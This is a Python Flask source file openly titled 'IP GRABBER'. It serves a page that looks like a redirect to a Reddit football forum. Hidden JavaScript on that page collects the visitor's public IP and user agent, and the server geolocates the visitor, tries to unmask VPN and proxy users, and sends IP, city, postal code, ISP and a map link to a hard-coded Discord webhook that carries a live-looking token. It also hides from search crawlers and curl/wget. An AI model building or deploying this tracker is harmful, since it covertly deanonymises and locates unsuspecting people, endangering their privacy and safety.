# main.py Â© [20/01/25] by [IP GRABBER]. All rights reserved.
"""
Fixed visitor logger:
 - Browser-based public IP collection via api.ipify
 - ipapi.co + ipwho.is fallback enrichment
 - enhanced VPN/proxy detection (logged)
 - proxy IP + port captured and shown separately
 - debug logging file + console prints
 - can BLOCK VPNs if BLOCK_VPN = True (default False for testing)
 - no more accidental 404s due to detection while testing
 - sends a single Discord embed per click
"""

from flask import Flask, request, redirect, jsonify, abort
import requests
from datetime import datetime
import threading
import time
import socket
import os
import re
import traceback

app = Flask(__name__)

# ========== CONFIG ==========
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"

# Set to True to block detected VPNs/proxies (will return 404). Default False so testing works.
BLOCK_VPN = False

# seconds between webhooks from same IP; 0 disables cooldown (every click sends)
COOLDOWN_SECONDS = 0

# Debug log file path
DEBUG_LOG_PATH = os.getenv("VISITOR_DEBUG_LOG", "visitor_debug.log")

# UA bot keywords
BOT_UA_KEYWORDS = [
    "googlebot","bingbot","slurp","duckduckbot","baiduspider",
    "yandexbot","sogou","exabot","facebot","facebookexternalhit",
    "ia_archiver","python-requests","go-http-client","curl","wget"
]

# datacenter / cloud provider substrings
CLOUD_ORG_KEYWORDS = [
    "amazon","aws","google cloud","google","microsoft","azure",
    "digitalocean","hetzner","linode","ovh","oracle","cloudflare",
    "rackspace","vultr","scaleway","kimsufi","contabo"
]

# expanded VPN provider keywords (consumer VPN names)
VPN_KEYWORDS_EXPANDED = [
    "vpn","proxy","private internet access","pia","nordvpn","protonvpn",
    "mullvad","surfshark","expressvpn","windscribe","hide.me","hidemyass",
    "torguard","vpnbook","perfect-privacy","purevpn","ipvanish",
    "vyprvpn","hotspotshield","privatevpn","vpn.ht","cyberghost","zenmate",
    "tunnelbear","anchorfree","psiphon","proton"
]

# cooldown tracking (kept but unused when COOLDOWN_SECONDS == 0)
last_sent_by_ip = {}

def clear_last_sent():
    global last_sent_by_ip
    last_sent_by_ip = {}
    threading.Timer(86400, clear_last_sent).start()
clear_last_sent()

# ========== UTIL ==========
def now_gmt():
    return datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")

def log_debug_line(line: str):
    """Write debug line to file and print to console."""
    try:
        ts_line = f"{now_gmt()} | {line}\n"
        print(ts_line.strip())
        with open(DEBUG_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(ts_line)
    except Exception:
        # avoid crashing on logging
        print("Failed to write debug log:", traceback.format_exc())

def is_bot_ua(ua: str) -> bool:
    if not ua:
        return False
    ua_l = ua.lower()
    return any(k in ua_l for k in BOT_UA_KEYWORDS)

# ========== IP ENRICH ==========
def fetch_ipapi(ip: str) -> dict:
    try:
        headers = {"User-Agent": "Mozilla/5.0 (compatible; VisitorLogger/1.0)"}
        r = requests.get(f"https://ipapi.co/{ip}/json/", headers=headers, timeout=6)
        if r.status_code == 200:
            return r.json() or {}
        else:
            log_debug_line(f"ipapi non-200 for {ip}: {r.status_code}")
    except Exception as e:
        log_debug_line(f"ipapi error for {ip}: {e}")
    return {}

def fetch_ipwho_is(ip: str) -> dict:
    try:
        r = requests.get(f"https://ipwho.is/{ip}", timeout=6)
        if r.status_code == 200:
            data = r.json() or {}
            if data.get("success", True) is not False:
                return data
            else:
                log_debug_line(f"ipwho.is returned success=false for {ip}")
        else:
            log_debug_line(f"ipwho.is non-200 for {ip}: {r.status_code}")
    except Exception as e:
        log_debug_line(f"ipwho.is error for {ip}: {e}")
    return {}

def enrich_ip(ip: str) -> dict:
    details = fetch_ipapi(ip)
    source = "ipapi"
    if not details or (not details.get("city") and not details.get("org") and not details.get("latitude")):
        fb = fetch_ipwho_is(ip)
        if fb:
            details = {
                "city": fb.get("city"),
                "region": fb.get("region"),
                "country_name": fb.get("country"),
                "postal": fb.get("postal") or fb.get("postal_code"),
                "org": fb.get("org") or fb.get("isp") or fb.get("connection", {}).get("asn_org"),
                "latitude": fb.get("latitude") or fb.get("lat"),
                "longitude": fb.get("longitude") or fb.get("lon"),
                "raw_fallback": fb
            }
            source = "ipwho.is"
    # normalize lat/lon
    try:
        lat = details.get("latitude") or details.get("lat") or 0
        lon = details.get("longitude") or details.get("lon") or 0
        details["latitude"] = float(lat) if lat not in (None, "", 0) else 0
        details["longitude"] = float(lon) if lon not in (None, "", 0) else 0
    except Exception:
        details["latitude"] = 0
        details["longitude"] = 0
    details.setdefault("city", None)
    details.setdefault("region", None)
    details.setdefault("country_name", None)
    details.setdefault("postal", None)
    details.setdefault("org", None)
    details.setdefault("security", {})
    details["_source"] = source
    return details

# ========== VPN/PROXY DETECTION (ENHANCED, LOG-ONLY unless BLOCK_VPN True) ==========
def reverse_dns_ptr(ip: str, timeout_sec: float = 0.45) -> str:
    try:
        orig = socket.getdefaulttimeout()
        socket.setdefaulttimeout(timeout_sec)
        try:
            host = socket.gethostbyaddr(ip)[0]
        finally:
            socket.setdefaulttimeout(orig)
        return host
    except Exception:
        return ""

def detect_vpn_or_proxy(details: dict, ip: str = None) -> bool:
    sec = details.get("security") or {}
    if isinstance(sec, dict) and (sec.get("vpn") or sec.get("proxy") or sec.get("hosting")):
        log_debug_line(f"vpn_flag via ipapi.security for {ip} - org={details.get('org')}")
        return True

    raw = details.get("raw_fallback") or {}
    if isinstance(raw, dict):
        if raw.get("threat"):
            log_debug_line(f"vpn_flag via raw_fallback threat for {ip}")
            return True
        typ = raw.get("type") or raw.get("connection", {}).get("type")
        if typ and str(typ).lower() in ("hosting", "vpn", "proxy"):
            log_debug_line(f"vpn_flag via raw_fallback type={typ} for {ip}")
            return True

    org = (details.get("org") or "") or ""
    org_l = org.lower()
    for kw in VPN_KEYWORDS_EXPANDED + CLOUD_ORG_KEYWORDS:
        if kw in org_l:
            log_debug_line(f"vpn_flag via org keyword '{kw}' for {ip}, org={org}")
            return True

    ptr = ""
    try:
        if ip:
            ptr = reverse_dns_ptr(ip, timeout_sec=0.45)
            if ptr:
                ptr_l = ptr.lower()
                ptr_indicators = [
                    "vpn","proxy","exit","node","tor","nat","pool","static",
                    "client","dialup","dynamic","dsl","ppp","mobile"
                ]
                if any(ind in ptr_l for ind in ptr_indicators):
                    log_debug_line(f"vpn_flag via PTR '{ptr}' for {ip}")
                    return True
    except Exception:
        pass

    # No detection -> return False
    return False

# ========== PROXY EXTRACTION HELPERS ==========
def parse_forwarded_header(forwarded_val: str):
    if not forwarded_val:
        return []
    entries = []
    parts = forwarded_val.split(",")
    for part in parts:
        record = {}
        for kv in part.split(";"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                record[k.strip().lower()] = v.strip().strip('"').strip()
        if record:
            entries.append(record)
    return entries

def extract_proxy_info_from_headers():
    # X-Forwarded-For: last element is the last proxy that connected to you
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        parts = [p.strip() for p in xff.split(",") if p.strip()]
        if len(parts) >= 1:
            # last element is the most recent proxy (or the last hop)
            last = parts[-1]
            if ":" in last and last.count(":") == 1:
                ip_part, port_part = last.split(":", 1)
                return ip_part, port_part, "X-Forwarded-For:last"
            return last, request.environ.get("REMOTE_PORT"), "X-Forwarded-For:last"

    # Forwarded header: check 'by' then 'for'
    fwd = request.headers.get("Forwarded", "")
    if fwd:
        parsed = parse_forwarded_header(fwd)
        if parsed:
            last = parsed[-1]
            for_key = last.get("by") or last.get("for")
            if for_key:
                for_key = for_key.strip()
                m = re.match(r'^\[?([0-9a-fA-F\.:]+)\]?(?::(\d+))?$', for_key)
                if m:
                    ip_part = m.group(1)
                    port_part = m.group(2) or request.environ.get("REMOTE_PORT")
                    return ip_part, port_part, "Forwarded:by/for"
                else:
                    return for_key, request.environ.get("REMOTE_PORT"), "Forwarded:raw"

    cf = request.headers.get("CF-Connecting-IP")
    if cf:
        return cf, request.environ.get("REMOTE_PORT"), "CF-Connecting-IP"

    tci = request.headers.get("True-Client-IP")
    if tci:
        return tci, request.environ.get("REMOTE_PORT"), "True-Client-IP"

    # fallback: remote addr + remote port
    return request.remote_addr, request.environ.get("REMOTE_PORT"), "remote_addr"

# ========== MAP & DISCORD ==========
def build_map_url(details: dict) -> str:
    lat = details.get("latitude", 0)
    lon = details.get("longitude", 0)
    if lat and lon:
        return f"https://www.google.com/maps?q={lat},{lon}"
    parts = [p for p in [details.get("city"), details.get("region"), details.get("country_name")] if p]
    if parts:
        q = "+".join("".join(str(x).split()) for x in parts)
        return f"https://www.google.com/maps/search/{q}"
    return "https://www.google.com/maps"

def send_discord_embed(info: dict) -> bool:
    color_red = 15158332
    map_url = info.get("map_url", "https://www.google.com/maps")
    proxy_ip = info.get("proxy_ip") or "Unknown"
    proxy_port = info.get("proxy_port") or "Unknown"
    embed_payload = {
        "username": "ðŸš¨ Visitor Alert",
        "embeds": [{
            "title": f"ðŸš¨ New Visitor â€” {info.get('city') or 'Unknown'}",
            "url": map_url,
            "description": f"**Real IP:** `{info.get('real_ip')}`",
            "color": color_red,
            "fields": [
                {"name": "ðŸ–¥ï¸ Real IP (from browser)", "value": f"`{info.get('real_ip')}`", "inline": True},
                {"name": "ðŸ” Proxy / Connecting IP", "value": f"`{proxy_ip}`", "inline": True},
                {"name": "ðŸ”Œ Proxy Port", "value": f"{proxy_port}", "inline": True},
                {"name": "ðŸ“ Location", "value": f"{info.get('city') or 'Unknown'}, {info.get('region') or 'Unknown'} ({info.get('country') or 'Unknown'})", "inline": False},
                {"name": "ðŸ“« Postal", "value": info.get('postal') or "Unknown", "inline": True},
                {"name": "ðŸ¢ ISP / Org", "value": info.get('org') or "Unknown ISP", "inline": True},
                {"name": "VPN/Proxy Detected", "value": "Yes ðŸš¨" if info.get('vpn') else "No âœ…", "inline": True},
                {"name": "ðŸŒ Map", "value": f"[Open Map]({map_url})", "inline": False},
                {"name": "ðŸ“± User Agent", "value": f"`{info.get('user_agent') or 'Unknown'}`", "inline": False},
                {"name": "Source", "value": info.get("_source") or "ipapi", "inline": True},
                {"name": "Time (UTC)", "value": info.get("time") or now_gmt(), "inline": True}
            ]
        }]
    }
    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=embed_payload, timeout=8)
        log_debug_line(f"Discord webhook status for {info.get('real_ip')}: {r.status_code} {r.text[:200]}")
        return 200 <= r.status_code < 300
    except Exception as e:
        log_debug_line(f"Discord webhook error for {info.get('real_ip')}: {e}")
        return False

# ========== ROUTES ===========
@app.route('/')
def root():
    # Serve JS that fetches public IP and posts to /log, then redirects
    html = f"""
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Redirectingâ€¦</title></head>
      <body>
        <script>
          fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => {{
              try {{
                fetch('/log', {{
                  method: 'POST',
                  headers: {{'Content-Type': 'application/json'}},
                  body: JSON.stringify({{ ip: d.ip, ua: navigator.userAgent }})
                }});
              }} catch(e){{}}
              window.location.replace('{REDIRECT_URL}');
            }})
            .catch(() => {{ window.location.replace('{REDIRECT_URL}'); }});
        </script>
        <p>Redirectingâ€¦</p>
      </body>
    </html>
    """
    return html

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "bad request"}), 400

    real_ip = data.get("ip")
    user_agent = data.get("ua") or request.headers.get("User-Agent", "Unknown")

    if not real_ip:
        return jsonify({"error": "no ip provided"}), 400

    # quick UA bot check -> 404 (still blocks known crawlers)
    if is_bot_ua(user_agent):
        log_debug_line(f"blocked bot ua: {user_agent}")
        abort(404)

    # cooldown logic (disabled when COOLDOWN_SECONDS == 0)
    now_ts = time.time()
    last_ts = last_sent_by_ip.get(real_ip, 0)
    if COOLDOWN_SECONDS > 0 and (now_ts - last_ts) < COOLDOWN_SECONDS:
        return jsonify({"status": "cooldown"}), 200

    # determine proxy info (best-effort)
    proxy_ip, proxy_port, proxy_source = extract_proxy_info_from_headers()
    log_debug_line(f"received log request: real_ip={real_ip}, proxy_ip={proxy_ip}, proxy_port={proxy_port}, proxy_source={proxy_source}, ua={user_agent}")

    # enrich based on the real IP (location of visitor)
    details = enrich_ip(real_ip)

    # detect vpn/proxy (log-only unless BLOCK_VPN True)
    vpn_flag = detect_vpn_or_proxy(details, ip=real_ip)

    # also check proxy connecting IP's org as heuristic
    proxy_vpn_flag = False
    if proxy_ip and proxy_ip != real_ip:
        proxy_details = enrich_ip(proxy_ip)
        proxy_vpn_flag = detect_vpn_or_proxy(proxy_details, ip=proxy_ip)
        if proxy_vpn_flag:
            log_debug_line(f"proxy IP {proxy_ip} flagged as vpn/proxy by heuristics")

    effective_vpn = vpn_flag or proxy_vpn_flag
    log_debug_line(f"vpn detection: real_vpn={vpn_flag}, proxy_vpn={proxy_vpn_flag}, effective={effective_vpn}")

    # If blocking is enabled, abort here
    if BLOCK_VPN and effective_vpn:
        log_debug_line(f"blocking request from {real_ip} due to VPN/proxy detection (BLOCK_VPN=True)")
        abort(404)

    # prepare info for embed
    info = {
        "real_ip": real_ip,
        "proxy_ip": proxy_ip,
        "proxy_port": proxy_port,
        "user_agent": user_agent,
        "city": details.get("city") or None,
        "region": details.get("region") or None,
        "country": details.get("country_name") or details.get("country") or None,
        "postal": details.get("postal") or None,
        "org": details.get("org") or None,
        "latitude": details.get("latitude") or 0,
        "longitude": details.get("longitude") or 0,
        "vpn": effective_vpn,
        "_source": details.get("_source"),
        "time": now_gmt()
    }
    info["map_url"] = build_map_url(details)

    # mark last-sent time (kept for potential future cooldown settings)
    last_sent_by_ip[real_ip] = now_ts

    # send the embed and log result
    success = send_discord_embed(info)
    if not success:
        log_debug_line(f"Failed to send embed for {real_ip}")

    return jsonify({"status": "ok", "sent": success}), 200

# ========== RUN ===========
if __name__ == "__main__":
    # Run on 0.0.0.0:10000 by default. In production use gunicorn main:app
    app.run(host="0.0.0.0", port=10000, debug=False)
